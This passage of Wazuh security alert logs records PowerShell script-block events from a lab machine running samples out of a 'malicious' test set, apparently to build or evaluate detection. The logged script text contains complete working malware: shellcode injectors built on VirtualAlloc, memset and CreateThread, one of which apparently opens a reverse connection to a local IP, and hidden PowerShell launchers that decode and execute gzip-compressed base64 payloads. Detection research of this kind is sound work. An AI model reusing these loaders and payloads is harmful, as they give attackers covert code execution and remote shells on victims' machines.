0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 73c35b3a-3221-4dbc-8a13-34080dbce9e2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1999.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xd1,0x85,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"73c35b3a-3221-4dbc-8a13-34080dbce9e2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1999.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:20.657+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":8,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304360.2598663","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:40.5853041Z","eventRecordID":"145107","processID":"4204","threadID":"2576","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\r\n\r\nScriptBlock ID: aeb38f56-3516-4d84-84b6-02381303974b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2007.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);","scriptBlockId":"aeb38f56-3516-4d84-84b6-02381303974b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2007.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:22.302+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":92,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304362.2609937","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:42.4122511Z","eventRecordID":"145116","processID":"4236","threadID":"4252","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$BsT2 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BsT2 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xb8,0x07,0x53,0x7f,0x04,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x03,0xb1,0x8a,0xf8,0xe3,0xb7,0x75,0x01,0xf3,0xd7,0xfc,0xe4,0xc2,0xd7,0x9b,0x6d,0x74,0xe8,0xe8,0x20,0x78,0x83,0xbd,0xd0,0x0b,0xe1,0x69,0xd6,0xbc,0x4c,0x4c,0xd9,0x3d,0xfc,0xac,0x78,0xbd,0xff,0xe0,0x5a,0xfc,0xcf,0xf4,0x9b,0x39,0x2d,0xf4,0xce,0x92,0x39,0xab,0xfe,0x97,0x74,0x70,0x74,0xeb,0x99,0xf0,0x69,0xbb,0x98,0xd1,0x3f,0xb0,0xc2,0xf1,0xbe,0x15,0x7f,0xb8,0xd8,0x7a,0xba,0x72,0x52,0x48,0x30,0x85,0xb2,0x81,0xb9,0x2a,0xfb,0x2e,0x48,0x32,0x3b,0x88,0xb3,0x41,0x35,0xeb,0x4e,0x52,0x82,0x96,0x94,0xd7,0x11,0x30,0x5e,0x4f,0xfe,0xc1,0xb3,0x16,0x75,0xcd,0x78,0x5c,0xd1,0xd1,0x7f,0xb1,0x69,0xed,0xf4,0x34,0xbe,0x64,0x4e,0x13,0x1a,0x2d,0x14,0x3a,0x3b,0x8b,0xfb,0x43,0x5b,0x74,0xa3,0xe1,0x17,0x98,0xb0,0x9b,0x75,0xf4,0x75,0x96,0x85,0x04,0x12,0xa1,0xf6,0x36,0xbd,0x19,0x91,0x7a,0x36,0x84,0x66,0x7d,0x6d,0x70,0xf8,0x80,0x8e,0x81,0xd0,0x46,0xda,0xd1,0x4a,0x6f,0x63,0xba,0x8a,0x90,0xb6,0x57,0x8e,0x06,0xf9,0x00,0x91,0xb2,0x91,0x52,0x92,0x2f,0xd1,0xda,0x74,0x1f,0x45,0x8d,0x28,0xdf,0x35,0x6d,0x99,0xb7,0x5f,0x62,0xc6,0xa7,0x5f,0xa8,0x6f,0x4d,0xb0,0x05,0xc7,0xf9,0x29,0x0c,0x93,0x98,0xb6,0x9a,0xd9,0x9a,0x3d,0x29,0x1d,0x54,0xb6,0x44,0x0d,0x00,0x36,0x13,0x6f,0x86,0x49,0x89,0x1a,0x26,0xdc,0x36,0x8d,0x71,0x48,0x35,0xe8,0xb5,0xd7,0xc6,0xdf,0xce,0xde,0x52,0xa0,0xb8,0x1e,0xb3,0x20,0x38,0x49,0xd9,0x20,0x50,0x2d,0xb9,0x72,0x45,0x32,0x14,0xe7,0xd6,0xa7,0x97,0x5e,0x8b,0x60,0xf0,0x5c,0xf2,0x47,0x5f,0x9e,0xd1,0x59,0xa3,0x49,0x1f,0x2c,0xcd,0x49;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PnSG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PnSG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PnSG,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 85d561d1-111e-43b6-addd-d6e8110a43a5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2022.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$BsT2 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BsT2 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd4,0xb8,0x07,0x53,0x7f,0x04,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x03,0xb1,0x8a,0xf8,0xe3,0xb7,0x75,0x01,0xf3,0xd7,0xfc,0xe4,0xc2,0xd7,0x9b,0x6d,0x74,0xe8,0xe8,0x20,0x78,0x83,0xbd,0xd0,0x0b,0xe1,0x69,0xd6,0xbc,0x4c,0x4c,0xd9,0x3d,0xfc,0xac,0x78,0xbd,0xff,0xe0,0x5a,0xfc,0xcf,0xf4,0x9b,0x39,0x2d,0xf4,0xce,0x92,0x39,0xab,0xfe,0x97,0x74,0x70,0x74,0xeb,0x99,0xf0,0x69,0xbb,0x98,0xd1,0x3f,0xb0,0xc2,0xf1,0xbe,0x15,0x7f,0xb8,0xd8,0x7a,0xba,0x72,0x52,0x48,0x30,0x85,0xb2,0x81,0xb9,0x2a,0xfb,0x2e,0x48,0x32,0x3b,0x88,0xb3,0x41,0x35,0xeb,0x4e,0x52,0x82,0x96,0x94,0xd7,0x11,0x30,0x5e,0x4f,0xfe,0xc1,0xb3,0x16,0x75,0xcd,0x78,0x5c,0xd1,0xd1,0x7f,0xb1,0x69,0xed,0xf4,0x34,0xbe,0x64,0x4e,0x13,0x1a,0x2d,0x14,0x3a,0x3b,0x8b,0xfb,0x43,0x5b,0x74,0xa3,0xe1,0x17,0x98,0xb0,0x9b,0x75,0xf4,0x75,0x96,0x85,0x04,0x12,0xa1,0xf6,0x36,0xbd,0x19,0x91,0x7a,0x36,0x84,0x66,0x7d,0x6d,0x70,0xf8,0x80,0x8e,0x81,0xd0,0x46,0xda,0xd1,0x4a,0x6f,0x63,0xba,0x8a,0x90,0xb6,0x57,0x8e,0x06,0xf9,0x00,0x91,0xb2,0x91,0x52,0x92,0x2f,0xd1,0xda,0x74,0x1f,0x45,0x8d,0x28,0xdf,0x35,0x6d,0x99,0xb7,0x5f,0x62,0xc6,0xa7,0x5f,0xa8,0x6f,0x4d,0xb0,0x05,0xc7,0xf9,0x29,0x0c,0x93,0x98,0xb6,0x9a,0xd9,0x9a,0x3d,0x29,0x1d,0x54,0xb6,0x44,0x0d,0x00,0x36,0x13,0x6f,0x86,0x49,0x89,0x1a,0x26,0xdc,0x36,0x8d,0x71,0x48,0x35,0xe8,0xb5,0xd7,0xc6,0xdf,0xce,0xde,0x52,0xa0,0xb8,0x1e,0xb3,0x20,0x38,0x49,0xd9,0x20,0x50,0x2d,0xb9,0x72,0x45,0x32,0x14,0xe7,0xd6,0xa7,0x97,0x5e,0x8b,0x60,0xf0,0x5c,0xf2,0x47,0x5f,0x9e,0xd1,0x59,0xa3,0x49,0x1f,0x2c,0xcd,0x49;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PnSG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PnSG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PnSG,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"85d561d1-111e-43b6-addd-d6e8110a43a5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2022.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:22.351+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":9,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304362.2621306","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:42.6399320Z","eventRecordID":"145117","processID":"1264","threadID":"4780","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRtDS2hlq0Xe72P7UGnmrfswvV0LsLx1NVdVUzbpxhcf359uJzo0/tOUc9VbU/JDIBnWSC29k1ucNHKX/ttm/iMJpgBlKAOzytUZOH5uFGbnOaRMjyU3eekTAgDJoatL1U3Ygx7iTN4fn+hu607xljKNUeDM9KL44U6clReW4b6aurqyHAhXI5EnK+QQJfTHKF9VmhAB2gsC4X4OBvP6nOFxv5eMVc0khS0n7ajO02U5KqyjhdHl3+/6QeCnoCP+6bSH1+9xvrm4gu5J5o+MXy44v/xPgf0dDHVIC3BdcSI/ve+Rs2Dmo6+vLYZQtU4h2e5APwNhanLfgi+RcjBe71dQoAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\r\n\r\nScriptBlock ID: b4c4a85f-ff32-4d1a-a842-5d42318bc071\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL7ZvFcCA7VWf2/aSBD9O5X6HawKCVslGAhNmkiVbm1jIAECMZgARaeNvTYLi5fYa371+t1vDDihbVLlKp2ViF3PzO7bN2927MWBIygPJG/lYZ08GtK39+9O2jjEc0nOiHK1XePn85yUEdtKWzk5AWOGCudiWV9KXyR5hBYLg88xDcZXV3ochiQQ+3m+SgSKIjJ/YJREsiL9I/UnJCSntw9T4gjpm5T5O19l/AGzg9tGx86ESKcocBNbgzs4QZa3FowKOfv1a1YZnRbH+cpjjFkkZ61NJMg87zKWVaTvSrJhd7MgcrZJnZBH3BP5Pg3OSvleEGGPtGC1JWkSMeFulFXgIPAXEhGHgZQeKVlj7yFnYdgOuYNcNyQRBOTrwZLPiJwJYsZy0l/y6ADgLg4EnROwCxLyhUXCJXVIlK/hwGXkjnhjuUVW6bnfGiQfB4FXW4RKDlLyMtImd2NG9sFZ5VesT5lU4EmzCRx8f//u/Tsv1QDVp3qrOJzjYxHA6GS0GxOAKrd5RHfOX6RCTmrCjljwcAPTTDeMiTKWRkkWRuOxlGEXXu718GLqC5506EzZcjJZP4BhZHPqjiHwkKTMqmA1+HLQ1b3bVWJ/XXQG8WhAjE2A59RJdSW/xD/xGNmdOp+6tQCinD0YiGsQRnwsEjpz0ujXsMqciqdYLabMJSFyIIcRoIL0Kj+C2WdIztaDJpkDYft5FnLhgZpJ6n1Q8CbdPZmDU1ZnOIpyUjuGcnJykkUwI25OQkFEDyYUC74bZp/hNmMmqIMjkS43Vn7m87CvzoNIhLEDuQQOutaCOBSzhJKcVKMu0TYW9dP9sy8SomPGaODDSktICLxJiLBEopAQoCZqUPIWEfX5gpE5uOzK22TYh2I+1MNOUdgnbvY1oKno9wpPqEk5OYIJ+bYYFznJpqGA2yKh+Vlif4Tl6LL4AZUekkOa5LSeRtpGJAWQWdW2RlAamo/VZiLbA2U7gkIB5Jghn2s4IudlS4RAnfxBvaU6gmdQD1jT0Wa0iFa0WG/Cf4+e1blx4d5cT2tqaKwnHqpH9WatbXRqtfLy2rLLwqrUxU27LpqV++nUQrW73kAM66jWpYXZoLxdXNOt1UDuYK2eb7XtqqCtt1Pf9QaG5/kXnnVX/GTSRl/vaIUSbhiVuNHXVlqhHFXoqtahvc7s2hQPA5vhnqf698VLTNeNcGoXeXNbR6g6OXO2155dnTTdzaCmXvbLM1RBSA8qtqnxm4EWorZqY9/mqxtf00q+jjTToWTY6Zlap2NqqFedPhqXqg+x93ii9e0SHS7u7yYwNwHCjVoo112y5YMOkFTlCPt34OPrJWfigY/xEWkfWzwq4ZnGkQY+5vARcA0WZpuBvdsrcWSz1j1GjeHGVNXioF1GtQLtV32ULIl9rYNRt